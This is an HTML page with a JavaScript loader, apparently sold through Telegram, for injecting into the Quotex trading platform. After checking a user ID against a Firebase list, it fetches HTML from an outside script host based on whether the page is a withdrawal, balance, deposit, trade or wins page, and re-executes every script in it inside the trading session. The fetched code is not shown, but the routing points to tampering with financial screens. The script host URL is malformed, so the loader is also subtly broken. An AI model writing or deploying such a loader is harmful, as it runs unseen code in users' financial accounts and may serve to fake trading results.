<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quotex System Integration</title>
    <style>
        /* Dialog Backdrop and Glassmorphism Styles built directly for stability */
        dialog#talhaLock {
            border: none;
            padding: 0;
            background: transparent;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        dialog#talhaLock::backdrop {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }
        .glass {
            width: 440px;
            max-width: 90vw;
            padding: 30px 25px;
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
            color: #ffffff;
            text-align: center;
            position: relative;
            animation: popIn 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
            margin: auto;
        }
        @keyframes popIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .info {
            margin: 1.5rem 0;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 14px;
            text-align: left;
        }
        .label {
            font-size: 0.75rem;
            letter-spacing: 1px;
            opacity: 0.5;
            margin-bottom: 6px;
            text-transform: uppercase;
            font-weight: 700;
        }
        .value-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
        }
        .value {
            font-size: 1rem;
            font-weight: 600;
            word-break: break-all;
            color: #00e676;
        }
        .copy-btn {
            position: relative;
            background: transparent;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            opacity: 0.8;
            transition: opacity 0.2s;
        }
        .copy-btn:hover { opacity: 1; }
        .copy-btn svg { width: 20px; height: 20px; fill: #fff; }
        .tooltip {
            position: absolute;
            top: -35px;
            left: 50%;
            transform: translateX(-50%);
            background: #00e676;
            color: #000;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            opacity: 0;
            transition: opacity 0.2s;
            pointer-events: none;
            font-weight: bold;
        }
        .copy-btn.show-tooltip .tooltip { opacity: 1; }
        .lock-icon img { width: 85px; height: auto; animation: pulseLogo 2s infinite ease-in-out; }
        @keyframes pulseLogo {
            0%, 100% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
        }
        .telegram-btn {
            display: inline-block;
            background: linear-gradient(135deg, #229ed9, #1d4ed8);
            color: white;
            padding: 12px 24px;
            border-radius: 12px;
            font-weight: 700;
            text-decoration: none;
            box-shadow: 0 4px 15px rgba(34, 158, 217, 0.3);
            transition: all 0.2s ease;
            margin-top: 1.5rem;
        }
        .telegram-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(34, 158, 217, 0.4); }
        .close-cross {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 1.5rem;
            color: rgba(255,255,255,0.6);
            cursor: pointer;
            transition: color 0.2s;
        }
        .close-cross:hover { color: #fff; }
    </style>
</head>
<body>

<script id="quotex-core-system">
(function() {
    'use strict';

    // ─── CONFIGURATION CONFIG ───────────────────────────────────────────────
    const CONFIG = {
        panelID: "talha-trader-admin-panel-lock",
        get dbEndpoint() { return `https://${this.panelID}-default-rtdb.firebaseio.com/users.json`; },
        scriptBaseURL: "https-talha-bhai-scripts.vercel.app/",
        timeoutLimit: 4500
    };

    // Extract core query filters
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id') || "";

    if (!userId) {
        console.warn("Quotex System Init Blocked: Missing User ID Parameter.");
        return;
    }

    // ─── ASYNC NETWORK HANDLER ──────────────────────────────────────────────
    async function executeSecureFetch(endpoint, timeout = CONFIG.timeoutLimit) {
        const controller = new AbortController();
        const timeoutTrigger = setTimeout(() => controller.abort(), timeout);

        try {
            const response = await fetch(endpoint, { signal: controller.signal });
            clearTimeout(timeoutTrigger);
            if (!response.ok) throw new Error(`HTTP Status Error: ${response.status}`);
            return response;
        } catch (error) {
            clearTimeout(timeoutTrigger);
            console.error("Network Fetch Failure:", error.message);
            return null;
        }
    }

    // ─── DOM ENGINE & QUOTEX LAYOUT CHECKS ──────────────────────────────────
    function checkElementVisibility(element) {
        return !!(element && (element.offsetWidth > 0 || element.offsetHeight > 0));
    }

    function detectQuotexLeaderboard() {
        // Targets active sidebar navigation contexts inside Quotex terminal
        const sidebarOpenElement = document.querySelector(".app--sidepanel-open") || 
                                   document.querySelector(".sidebar-panel") ||
                                   document.querySelector("[data-sidebar]");
        return checkElementVisibility(sidebarOpenElement);
    }

    function detectQuotexActiveTrades() {
        // Verifies presence of live trade elements inside dealing processing panels
        const operationalTradeIndex = document.querySelector("div[data-index]") || 
                                      document.querySelector(".dealing-list") ||
                                      document.querySelector(".trades-list");
        return !!operationalTradeIndex;
    }

    function isMobilePlatform() {
        return /Android|iPhone|iPad|iPod|Windows Phone|IEMobile|Opera Mini/i.test(navigator.userAgent) 
            || window.innerWidth <= 1025;
    }

    // ─── ROUTING RULES ENGINE ───────────────────────────────────────────────
    function evaluationRoutingPipeline(userData) {
        const currentURL = window.location.href;
        const checkDash = urlParams.get('dash') === 'true';
        const checkWin = urlParams.get('win') === 'true';

        let targetRoute = null;

        // Condition Hierarchy 1: Hardcoded URL Target Strings
        if (checkDash) {
            targetRoute = { file: "BL.html", key: "lb" };
        } else if (checkWin) {
            targetRoute = { file: "wins.html", key: "win" };
        } 
        // Condition Hierarchy 2: Keyword Context matching standard Quotex architecture endpoints
        else if (currentURL.includes("withdrawal") || currentURL.includes("cashout")) {
            targetRoute = { file: "ps.html", key: "p" };
        } else if (currentURL.includes("balance") || currentURL.includes("deposit") || currentURL.includes("account")) {
            targetRoute = { file: "ts.html", key: "t" };
        } else if (currentURL.includes("analytics") || currentURL.includes("statistics")) {
            targetRoute = { file: "anas.html", key: "ana" };
        } 
        // Condition Hierarchy 3: Dynamic Device Engine Selection for Direct Trading URLs
        else if (currentURL.includes("demo-trade") || currentURL.includes("trade") || currentURL.includes("terminal")) {
            const isMobileDevice = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
            const dynamicScriptFile = isMobileDevice ? "androids.html" : "pcs.html";
            targetRoute = {
                file: dynamicScriptFile,
                key: isMobileDevice ? "android" : "pc"
            };
        } 
        // Condition Hierarchy 4: Real-time UI Layout DOM Element Extraction Fallbacks
        else if (detectQuotexLeaderboard()) {
            targetRoute = { file: "BL.html", key: "lb" };
        } else if (detectQuotexActiveTrades()) {
            targetRoute = { file: "wins.html", key: "win" };
        } 
        // Operational Exception: Unrecognized Routing Environment Matcher
        else {
            triggerInterfaceErrorWarning();
            return;
        }

        executeRouteDeployment(targetRoute, userData);
    }

    // ─── DEPLOYMENT INJECTOR ────────────────────────────────────────────────
    function executeRouteDeployment(route, user) {
        // Enforce Server Side Permissions Validation Layer
        if (user.permissions && user.permissions[route.key] === false) {
            renderQuotexSystemLockModal(userId);
            return;
        }

        // Flush stale iterations to avoid DOM collisions
        document.querySelectorAll("[id^='talha-injected-']").forEach(node => node.remove());

        const injectionContainer = document.createElement('div');
        injectionContainer.id = `talha-injected-${route.key}`;
        document.body.appendChild(injectionContainer);

        fetch(`${CONFIG.scriptBaseURL}${route.file}`)
            .then(res => {
                if(!res.ok) throw new Error("Failed to load operational route source file.");
                return res.text();
            })
            .then(htmlPayload => {
                injectionContainer.innerHTML = htmlPayload;
                
                // Process, clone and re-evaluate script elements cleanly to execute scope code hooks
                injectionContainer.querySelectorAll('script').forEach(staleScript => {
                    const dynamicScriptNode = document.createElement('script');
                    if (staleScript.src) {
                        dynamicScriptNode.src = staleScript.src;
                    } else {
                        dynamicScriptNode.textContent = staleScript.textContent;
                    }
                    document.body.appendChild(dynamicScriptNode);
                });
            })
            .catch(err => console.error("Critical Execution Interruption on Route Deployment:", err));
    }

    // ─── MODAL USER INTERFACES (ERRORS & SECURITY LOCK) ─────────────────────
    function triggerInterfaceErrorWarning() {
        if (document.getElementById('talhaErrorPopup')) return;

        const warningOverlay = document.createElement("div");
        warningOverlay.id = "talhaErrorPopup";
        warningOverlay.innerText = "⚠️ OPEN QUOTEX PLATFORM OR CORRECT RUNTIME URL ⚠️";
        
        Object.assign(warningOverlay.style, {
            position: "fixed",
            top: "5%,",
            left: "50%",
            transform: "translate(-50%, 0)",
            background: "#d32f2f",
            color: "white",
            padding: "16px 24px",
            borderRadius: "8px",
            fontWeight: "bold",
            fontSize: "14px",
            zIndex: "1000000",
            boxShadow: "0 10px 30px rgba(0,0,0,0.5)",
            textAlign: "center",
            letterSpacing: "0.5px"
        });

        document.body.appendChild(warningOverlay);
        setTimeout(() => {
            warningOverlay.style.opacity = "0";
            warningOverlay.style.transition = "opacity 0.6s ease";
            setTimeout(() => warningOverlay.remove(), 600);
        }, 4000);
    }

    function renderQuotexSystemLockModal(uid) {
        document.querySelectorAll("dialog#talhaLock").forEach(activeDialog => {
            try { activeDialog.close(); } catch(e){}
            activeDialog.remove();
        });

        const modalStructure = `
            <div class="glass">
                <div class="close-cross">&times;</div>
                <div class="lock-icon"><img src="https://logo-png-sigma.vercel.app/TQK.png" alt="Quotex Secure Lock"/></div>
                <div style="font-size:1.8rem; font-weight:800; text-shadow:0 4px 15px rgba(0,0,0,0.5); letter-spacing:1px; margin-bottom:5px;">QUOTEX SYSTEM</div>
                <div style="font-size:0.9rem; color:#ff5252; font-weight:700; margin-bottom:1.5rem; letter-spacing:2px;">🔒 ACCESS DENIED / LOCKED 🔒</div>
                
                <div class="info">
                    <div class="label">System Identity Token</div>
                    <div class="value-row">
                        <div class="value" id="userIdField">${uid}</div>
                        <button class="copy-btn" id="copyBtnTalha" title="Copy Token">
                            <svg viewBox="0 0 24 24"><path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1zm3 4H8a2 2 0 0 0-2 2v16h13a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2z"/></svg>
                            <span class="tooltip">Copied ✓</span>
                        </button>
                    </div>
                </div>

                <div style="font-size: 0.85rem; opacity: 0.7; padding: 0 10px; line-height: 1.4;">
                    Your hardware configuration profile has not been whitelisted. Contact administrator on Telegram to activate access.
                </div>

                <div style="margin-top:20px;">
                    <a href="https://t.me/TALHAQOTEXKING" target="_blank" class="telegram-btn">🚀 CONNECT TO TELEGRAM</a>
                </div>
            </div>
        `;

        const coreDialogElement = document.createElement("dialog");
        coreDialogElement.id = "talhaLock";
        coreDialogElement.innerHTML = modalStructure;
        document.body.appendChild(coreDialogElement);
        
        try {
            coreDialogElement.showModal();
        } catch(error) {
            // Fallback strategy for legacy engine versions missing built-in modal controllers
            coreDialogElement.style.position = "fixed";
            coreDialogElement.style.top = "0";
            coreDialogElement.style.left = "0";
            coreDialogElement.style.width = "100vw";
            coreDialogElement.style.height = "100vh";
            coreDialogElement.style.display = "flex";
            coreDialogElement.style.alignItems = "center";
            coreDialogElement.style.justifyContent = "center";
            coreDialogElement.style.background = "rgba(0,0,0,0.7)";
            coreDialogElement.style.zIndex = "999999";
        }

        // Setup interaction control handlers
        coreDialogElement.querySelector("#copyBtnTalha").onclick = function(e) {
            e.preventDefault();
            navigator.clipboard.writeText(uid).then(() => {
                this.classList.add('show-tooltip');
                setTimeout(() => this.classList.remove('show-tooltip'), 1500);
            }).catch(() => {
                console.error("Clipboard operational access blocked by device security layer context.");
            });
        };

        const executionDestructionClosure = function() {
            try { coreDialogElement.close(); } catch(e){}
            coreDialogElement.remove();
        };

        coreDialogElement.querySelector(".close-cross").onclick = executionDestructionClosure;
    }

    // ─── KICKSTART SYSTEM INITIALIZATION ────────────────────────────────────
    async function initializeSystemExecutionState() {
        console.log("Initializing Secure System Routing Engine Layer for Quotex...");
        const networkResponse = await executeSecureFetch(CONFIG.dbEndpoint);
        const dataPayload = networkResponse ? await networkResponse.json().catch(() => null) : null;
        
        const verifiedUserContext = dataPayload 
            ? Object.values(dataPayload).find(profile => profile && profile.id === userId) 
            : null;

        if (verifiedUserContext) {
            console.log("Authentication Validation Passed. Synchronizing environment configurations...");
            evaluationRoutingPipeline(verifiedUserContext);
        } else {
            console.warn("Authentication Validation Failed. Deploying Interface Interlock Layer.");
            renderQuotexSystemLockModal(userId);
        }
    }

    // Safe execution window initialization block
    if (document.readyState === "complete" || document.readyState === "interactive") {
        initializeSystemExecutionState();
    } else {
        window.addEventListener("DOMContentLoaded", initializeSystemExecutionState);
    }

})();
</script>

</body>
</html>
